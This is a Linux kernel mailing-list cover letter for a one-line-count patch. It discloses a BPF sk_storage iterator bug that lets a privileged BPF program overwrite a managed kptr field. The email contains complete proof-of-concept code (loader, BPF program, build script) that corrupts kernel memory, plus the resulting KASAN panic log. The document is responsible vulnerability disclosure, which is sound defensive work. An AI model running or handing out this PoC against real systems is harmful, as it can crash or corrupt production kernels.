Received: from mail-dy1-f172.google.com (mail-dy1-f172.google.com [74.125.82.172])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id E51673C1D57
	for <bpf@vger.kernel.org>; Wed, 14 Oct 2026 12:24:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.82.172
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791980664; cv=none; b=b0TVOeyzvO1q6XUCBnr5LZuzQPLjOLh/Aofcz21RAds8/FKm0wxdx0n9rZ3ydvPMD7w0+7KMLVc+krkBXp7avVCfzaSGZIq+9S5STAGRrb7dsq3hhFhxna3WNZ8K2STM3bt224sle2ZFoJc9PiMhDvBFjDI4RZqYrgawNgK6uUM=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791980664; c=relaxed/simple;
	bh=z91VkM//Rawe7iPP1P1VANwhcJLUVFQyO7OcwBmxoNg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=fAjQAWHyfTRGbv6Vn7Xvya55SMvVxl08eBgL2dW7Batc8mkTcXeMfBPOBDGUUPiAsYLibBQ8XL4aXFUrvYwaFZOj0jUIPAhImeWQg0I83tY61lEHh9q1hlXRv7SIh35OJyIFk8gMjG3KV4lX7VimSrJ+Gw8KO4EOW8dEBjdXskE=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=ImkLoI/W; arc=none smtp.client-ip=74.125.82.172
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="ImkLoI/W"
Received: by mail-dy1-f172.google.com with SMTP id 5a478bee46e88-3514b90bb89so1502489eec.1
        for <bpf@vger.kernel.org>; Wed, 14 Oct 2026 05:24:22 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1791980662; x=1792585462; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=7lXaxcWTWAWzACS+lncX+kQmLDQB3NSxWJo9S5FZBHw=;
        b=ImkLoI/WLXnbzr1MwUhmWgtMZ4bUht9aNFdW0NKGQPKzeV550QGOXwGMNKFPCdPBkz
         kBn+0ybOTHDT2N/gWC/Xt06eOVf+/A9yswWAVUXfm9R2EwIR1tit90i6CGf+slb5VhAc
         li0A8szGOngEcfVbHoYXAnRxFu7HaLf+5fLeMsBsI4mio2F6V+rPY0jGculqDljwsYnQ
         SJdSpgse/IN7JbduWDZ9/6UW6n2utNtMcojs5mtNipZ1BKjBuYjsTkIzfTL3os9+Rbc4
         Jmr4ABryZfwFU9gLyl2EmkWxzKoMkEBj4VM90vw7xMibYyKu3XJaXuuf+Ej3Vc7WhJPo
         YTaQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1791980662; x=1792585462;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=7lXaxcWTWAWzACS+lncX+kQmLDQB3NSxWJo9S5FZBHw=;
        b=zF6g+EhQSHlpQq9KnVY8LOVjkQyONVC4WyVEj/3JT2eTqaOGEBt1V26qhiGYquUhH1
         HSYbNJqrOsbxWxPK+FstEFz7me6BFBgk85cfgG0LYvVUWl7cm9rSHpb7jjkBjfu6/Rjh
         n/0nzzKmz6PJ/oA6kzquKlrBbKo3G0FAMXhwy0HyTm83HjJN1igb8vVpL5pnDK/lr8Ja
         2EL0IMvSdOpU04bSCfDcPAnaUC4kVjwNjSTYuuu+Pn9S4Vav4vaTFyvbtAU/AAVyCza6
         ZBKJsFb1/6208SF35QjteNtbiho9qC0Lyskn0MVHmISnu6ePOPYTuPkE6hhGqUIRTr4V
         JhDw==
X-Forwarded-Encrypted: i=1; AKwUvBywYkHWI65EyD+16YTyzVnC4mXvO2gZ5gjEzCySuknEyQEwSyO7deuECROOcqvONYli6UE=@vger.kernel.org
X-Gm-Message-State: AFq9FYITZkbVlWFG3n7Bw6h8C/FNd+SsIHzEq4tLqZicZ5LCGO5vqHnU
	VbCwPhYcfdV9o7l/I14k7uwHCcDqLV7tTmgKUTHahSHaC8cBezjDnvO80yVzLwBJqVTd
X-Gm-Gg: AYBFou3Q6os/0LxN4THEE3pv9zLS+7MqtfiNiRCwKK4xxMtzoJNXRJ9jCBU4DwV2lAs
	m3QFSy9JgyJ3kB6tIFayFO4uZM7jJikZo4IJzV9ltKY1GXShxqomeWhjSSpBrUo1rI0eoB0Ko7g
	1fSnug628V48HW3uytNcRaCNjuFCvcr+euQ2DI6TL3psg+LZAHSqbDn+WREk9wu0qEon9c42AWy
	/1SNL4LFdS164AMyLa5SQsdGjc30Cfd+O3oOczIR4FgP/L201BL3itB/+Nk4dyD1dNZGzXlDxeW
	RCux7sVU4y1JlK7Jf4bRJBXkBceU/6z2wNKtlZs+8PmA//fCpq8S52u9gCucuFQGAw9umfn+gEJ
	yIk6V0qvyaYZ3ORHY5cgJCj+zHkqSLy7tgmZwk74usACRLgd88UKRFgZ3KjyaTAkAPbD4mZD9Gp
	N46GRJ8l1QZIhY8f5Vs8F7MNY1s1iv9jDpNbeH+c4CBBwYSmfefLcZ41O3zTtaYwhlmE7ph420D
	MuFfsY=
X-Received: by 2002:a05:7300:f582:b0:34d:755b:d60b with SMTP id 5a478bee46e88-3537e048b67mr20539684eec.34.1791980661389;
        Wed, 14 Oct 2026 05:24:21 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id 5a478bee46e88-358ee8a3387sm43357994eec.15.2026.10.14.05.24.16
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 14 Oct 2026 05:24:20 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org,
	bpf@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	ameryhung@gmail.com,
	ast@kernel.org,
	martin.lau@kernel.org,
	daniel@iogearbox.net,
	leon.hwang@linux.dev,
	mattbobrowski@google.com,
	zhilinz@nebusec.ai,
	menglong8.dong@gmail.com,
	kees@kernel.org,
	bestswngs@gmail.com,
	memxor@gmail.com,
	vega@nebusec.ai
Subject: [PATCH net 0/1] bpf: reject raw iteration over managed sk_storage values
Date: Wed, 14 Oct 2026 20:24:06 +0800
Message-ID: <cover.1791980149.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: bpf@vger.kernel.org
List-Id: <bpf.vger.kernel.org>
List-Subscribe: <mailto:bpf+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:bpf+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/core/bpf_sk_storage.c. A root
user with the capabilities required for tracing BPF programs and socket
storage maps can trigger memory corruption through the storage iterator.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The bpf_sk_storage_map iterator exposes each storage value as a writable
PTR_TO_BUF. bpf_iter_attach_map() only bounds the program's maximum
access by map->value_size; it does not account for BTF-managed fields in
the map value.

A BPF program can therefore overwrite an __kptr field directly, bypassing
the verifier's kptr ownership checks and bpf_kptr_xchg() protocol. When
the socket-storage element is deleted, bpf_selem_free() passes the
corrupted value to bpf_obj_free_fields(). The supplied PoC writes 0x1000
into a local-object kptr and triggers a KASAN fault in bpf_mem_free_rcu().

Reject iterator attachments that access values in maps with BTF-managed
fields. Iterators that do not access values and maps without managed
fields retain their existing behavior.

Reproducer:

    ./poc.sh

The supplied prebuilt poc.bpf.o is used by the script. It requires
bpftool, libbpf, and Python 3 in the guest. We ran it as root in a
2 vCPU, 2 GB x86 QEMU environment.

------BEGIN poc.c------

    #define _GNU_SOURCE
    #include <bpf/bpf.h>
    #include <bpf/libbpf.h>
    #include <errno.h>
    #include <fcntl.h>
    #include <linux/bpf.h>
    #include <netinet/in.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/resource.h>
    #include <sys/socket.h>
    #include <unistd.h>

    struct storage_init {
    	__u64 tag;
    	__u64 ignored_kptr_bytes;
    };

    static void die(const char *what)
    {
    	fprintf(stderr, "%s: %s\n", what, strerror(errno));
    	exit(1);
    }

    static void die_libbpf(const char *what, int err)
    {
    	errno = -err;
    	die(what);
    }

    static void raise_memlock(void)
    {
    	struct rlimit lim = {
    		.rlim_cur = RLIM_INFINITY,
    		.rlim_max = RLIM_INFINITY,
    	};

    	if (setrlimit(RLIMIT_MEMLOCK, &lim) && errno != EPERM)
    		die("setrlimit(RLIMIT_MEMLOCK)");
    }

    static int run_iter(struct bpf_program *prog, int map_fd)
    {
    	DECLARE_LIBBPF_OPTS(bpf_iter_attach_opts, opts);
    	union bpf_iter_link_info linfo;
    	struct bpf_link *link;
    	char buf[64];
    	int iter_fd;
    	int len;

    	memset(&linfo, 0, sizeof(linfo));
    	linfo.map.map_fd = map_fd;
    	opts.link_info = &linfo;
    	opts.link_info_len = sizeof(linfo);

    	link = bpf_program__attach_iter(prog, &opts);
    	if (libbpf_get_error(link))
    		return libbpf_get_error(link);

    	iter_fd = bpf_iter_create(bpf_link__fd(link));
    	if (iter_fd < 0) {
    		int err = -errno;

    		bpf_link__destroy(link);
    		return err;
    	}

    	for (;;) {
    		len = read(iter_fd, buf, sizeof(buf));
    		if (len == 0)
    			break;
    		if (len < 0) {
    			int err = -errno;

    			close(iter_fd);
    			bpf_link__destroy(link);
    			return err;
    		}
    	}

    	close(iter_fd);
    	bpf_link__destroy(link);
    	return 0;
    }

    int main(void)
    {
    	struct storage_init init = {
    		.tag = 0x1337,
    	};
    	struct bpf_program *prog;
    	struct bpf_object *obj;
    	int map_fd;
    	int sock_fd;
    	int err;

    	raise_memlock();
    	libbpf_set_strict_mode(LIBBPF_STRICT_ALL);
    	libbpf_set_print(NULL);

    	obj = bpf_object__open_file("./poc.bpf.o", NULL);
    	if (libbpf_get_error(obj))
    		die_libbpf("bpf_object__open_file", libbpf_get_error(obj));

    	err = bpf_object__load(obj);
    	if (err)
    		die_libbpf("bpf_object__load", err);

    	map_fd = bpf_object__find_map_fd_by_name(obj, "sk_stg_map");
    	if (map_fd < 0)
    		die_libbpf("bpf_object__find_map_fd_by_name", map_fd);

    	prog = bpf_object__find_program_by_name(obj, "forge_bpf_sk_storage_kptr");
    	if (!prog) {
    		errno = ENOENT;
    		die("bpf_object__find_program_by_name");
    	}

    	sock_fd = socket(AF_INET6, SOCK_STREAM, 0);
    	if (sock_fd < 0)
    		die("socket(AF_INET6, SOCK_STREAM)");

    	err = bpf_map_update_elem(map_fd, &sock_fd, &init, BPF_NOEXIST);
    	if (err)
    		die("bpf_map_update_elem(sk_storage)");

    	err = run_iter(prog, map_fd);
    	if (err)
    		die_libbpf("run_iter", err);

    	fprintf(stderr, "[*] forged kptr in sk_storage value, deleting element now\n");
    	fflush(stderr);

    	err = bpf_map_delete_elem(map_fd, &sock_fd);
    	if (err)
    		die("bpf_map_delete_elem(sk_storage)");

    	fprintf(stderr, "[!] delete unexpectedly returned without crashing\n");
    	close(sock_fd);
    	bpf_object__close(obj);
    	return 0;
    }

------END poc.c--------

------BEGIN poc.bpf.c------

    #include "vmlinux.h"
    #include <bpf/bpf_helpers.h>
    #include <bpf/bpf_tracing.h>

    char LICENSE[] SEC("license") = "GPL";

    struct local_obj {
    	__u64 marker;
    };

    /* Force LLVM to emit full BTF for local_obj instead of a forward decl. */
    struct local_obj *btf_anchor;

    struct storage_val {
    	__u64 tag;
    	struct local_obj __kptr *ptr;
    };

    struct {
    	__uint(type, BPF_MAP_TYPE_SK_STORAGE);
    	__uint(map_flags, BPF_F_NO_PREALLOC);
    	__type(key, int);
    	__type(value, struct storage_val);
    } sk_stg_map SEC(".maps");

    SEC("iter/bpf_sk_storage_map")
    int forge_bpf_sk_storage_kptr(struct bpf_iter__bpf_sk_storage_map *ctx)
    {
    	struct storage_val *val = ctx->value;
    	volatile __u64 *raw_kptr;

    	if (!ctx->sk || !val)
    		return 0;

    	if (val->tag != 0x1337)
    		return 0;

    	raw_kptr = (volatile __u64 *)&val->ptr;
    	*raw_kptr = 0x1000;
    	return 0;
    }

------END poc.bpf.c--------

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    if [ ! -f ./poc.bpf.o ]; then
    	if ! command -v clang >/dev/null 2>&1; then
    		echo "missing ./poc.bpf.o and clang is unavailable" >&2
    		exit 1
    	fi
    	clang -O2 -g -target bpf -D__TARGET_ARCH_x86 -I. -I./include -c poc.bpf.c -o poc.bpf.o
    fi

    gcc -O2 -g -Wall -o poc poc.c -lbpf -lelf -lz
    exec ./poc

------END poc.sh--------

----BEGIN crash log----

[  565.939149][T10631] Oops: general protection fault, probably for non-canonical address 0xdffffc00000001ff: 0000 [#1] PREEMPT SMP KASAN NOPTI
[  565.940317][T10631] KASAN: null-ptr-deref in range [0x0000000000000ff8-0x0000000000000fff]
[  565.940900][T10631] CPU: 2 UID: 0 PID: 10631 Comm: poc Not tainted 6.12.95 #2
[  565.941419][T10631] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  565.942280][T10631] RIP: 0010:bpf_mem_free_rcu+0x2e/0x1d0
[  565.942721][T10631] Code: 48 85 f6 0f 84 55 01 00 00 48 b8 00 00 00 00 00 fc ff df 41 55 41 54 49 89 f4 55 48 89 fd 48 8d 7e f8 53 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 4f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b
[  565.943975][T10631] RSP: 0018:ffffc90013dbfae8 EFLAGS: 00010016
[  565.944492][T10631] RAX: dffffc0000000000 RBX: ffff88807deaf038 RCX: 1ffff110219809c0
[  565.944999][T10631] RDX: 00000000000001ff RSI: 0000000000001000 RDI: 0000000000000ff8
[  565.945495][T10631] RBP: ffffffff99d58fa0 R08: ffffffff81a67790 R09: ffffed102275f88e
[  565.945984][T10631] R10: 0000000000001000 R11: 0000000000000001 R12: 0000000000001000
[  565.946493][T10631] R13: 0000000000000000 R14: ffff88807deaf020 R15: dffffc0000000000
[  565.946986][T10631] FS:  00007fdedf88a740(0000) GS:ffff888118b00000(0000) knlGS:0000000000000000
[  565.947557][T10631] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  565.947979][T10631] CR2: 00007fdedfc07000 CR3: 000000007ebbe000 CR4: 0000000000750ef0
[  565.948485][T10631] PKRU: 55555554
[  565.948711][T10631] Call Trace:
[  565.949346][T10631]  <TASK>
[  565.949540][T10631]  bpf_obj_free_fields+0x38e/0x490
[  565.949882][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.950270][T10631]  bpf_selem_free+0x46/0x110
[  565.950566][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.950917][T10631]  bpf_selem_unlink_storage_nolock.constprop.0+0x25d/0x860
[  565.951374][T10631]  bpf_selem_unlink_storage+0x132/0x2e0
[  565.951726][T10631]  bpf_fd_sk_storage_delete_elem+0x118/0x180
[  565.952135][T10631]  ? __sys_bpf+0x23cf/0x4210
[  565.952429][T10631]  ? __pfx_bpf_fd_sk_storage_delete_elem+0x10/0x10
[  565.952839][T10631]  ? lock_acquire+0x2f/0xb0
[  565.953170][T10631]  ? __sys_bpf+0x23cf/0x4210
[  565.953466][T10631]  __sys_bpf+0x2440/0x4210
[  565.953752][T10631]  ? __pfx___sys_bpf+0x10/0x10
[  565.954070][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.954421][T10631]  ? vfs_write+0x9ff/0xf30
[  565.954728][T10631]  ? __pfx_vfs_write+0x10/0x10
[  565.955064][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.955435][T10631]  ? ksys_write+0x17c/0x1d0
[  565.955722][T10631]  ? __pfx_ksys_write+0x10/0x10
[  565.956036][T10631]  __x64_sys_bpf+0x78/0xc0
[  565.956329][T10631]  ? srso_alias_return_thunk+0x5/0xfbef5
[  565.956684][T10631]  ? lockdep_hardirqs_on+0x7b/0x110
[  565.957025][T10631]  do_syscall_64+0xc7/0x270
[  565.957334][T10631]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[  565.957715][T10631] RIP: 0033:0x7fdedfaa57b9
[  565.958002][T10631] Code: ff c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 27 66 0d 00 f7 d8 64 89 01 48
[  565.959226][T10631] RSP: 002b:00007ffd07695e78 EFLAGS: 00000246 ORIG_RAX: 0000000000000141
[  565.959757][T10631] RAX: ffffffffffffffda RBX: 0000000000000009 RCX: 00007fdedfaa57b9
[  565.960253][T10631] RDX: 0000000000000020 RSI: 00007ffd07695e80 RDI: 0000000000000003
[  565.960741][T10631] RBP: 000055adbfb7c2a0 R08: 0000000000000000 R09: 0000000000000004
[  565.961234][T10631] R10: 0000000000000000 R11: 0000000000000246 R12: 00007ffd07695f80
[  565.961720][T10631] R13: 0000000000000004 R14: 000055adbfb7d810 R15: 00007ffd07695f3c
[  565.962235][T10631]  </TASK>
[  565.962430][T10631] Modules linked in:
[  565.962693][T10631] ---[ end trace 0000000000000000 ]---
[  565.963034][T10631] RIP: 0010:bpf_mem_free_rcu+0x2e/0x1d0
[  565.963397][T10631] Code: 48 85 f6 0f 84 55 01 00 00 48 b8 00 00 00 00 00 fc ff df 41 55 41 54 49 89 f4 55 48 89 fd 48 8d 7e f8 53 48 89 fa 48 c1 ea 03 <80> 3c 02 00 0f 85 4f 01 00 00 48 b8 00 00 00 00 00 fc ff df 49 8b
[  565.964598][T10631] RSP: 0018:ffffc90013dbfae8 EFLAGS: 00010016
[  565.964982][T10631] RAX: dffffc0000000000 RBX: ffff88807deaf038 RCX: 1ffff110219809c0
[  565.965489][T10631] RDX: 00000000000001ff RSI: 0000000000001000 RDI: 0000000000000ff8
[  565.965978][T10631] RBP: ffffffff99d58fa0 R08: ffffffff81a67790 R09: ffffed102275f88e
[  565.966479][T10631] R10: 0000000000001000 R11: 0000000000000001 R12: 0000000000001000
[  565.966979][T10631] R13: 0000000000000000 R14: ffff88807deaf020 R15: dffffc0000000000
[  565.967488][T10631] FS:  00007fdedf88a740(0000) GS:ffff888118b00000(0000) knlGS:0000000000000000
[  565.968045][T10631] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  565.968454][T10631] CR2: 00007fdedfc07000 CR3: 000000007ebbe000 CR4: 0000000000750ef0
[  565.968945][T10631] PKRU: 55555554
[  565.969183][T10631] Kernel panic - not syncing: Fatal exception
[  565.969732][T10631] Kernel Offset: disabled
[  565.970010][T10631] Rebooting in 86400 seconds..

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  bpf: reject raw iteration over managed sk_storage values

 net/core/bpf_sk_storage.c | 6 ++++++
 1 file changed, 6 insertions(+)

-- 
2.55.0

